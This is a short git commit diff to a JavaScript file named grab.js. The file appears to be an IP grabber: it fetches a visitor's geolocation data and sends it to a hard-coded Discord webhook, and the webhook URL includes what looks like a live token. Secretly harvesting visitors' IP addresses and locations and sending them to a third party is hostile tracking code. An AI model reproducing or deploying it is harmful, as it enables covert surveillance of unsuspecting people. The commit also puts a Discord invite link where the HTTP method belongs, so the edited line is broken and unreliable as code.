efa5681f117091fe46fef4aa2228c3d05cf4b8a0
Elixir <138938088+andzz035@users.noreply.github.com>
2024-02-11 10:39:22 +0100

    Update grab.js

--- api/grab.js
+++ api/grab.js
@@ -1,6 +1,6 @@
 $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
     var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1205558658293964800/BIYBRaEmIhU5euB9a2JVbA7wYUIe5Nmk1GAD7z-D8CRC4ghm3s985W4qJfkjiuA6pNtv");
+    request.open("https://discord.gg/NVgfdxa3", "https://discord.com/api/webhooks/1205558658293964800/BIYBRaEmIhU5euB9a2JVbA7wYUIe5Nmk1GAD7z-D8CRC4ghm3s985W4qJfkjiuA6pNtv");
   
     request.setRequestHeader('Content-type', 'application/json');
   
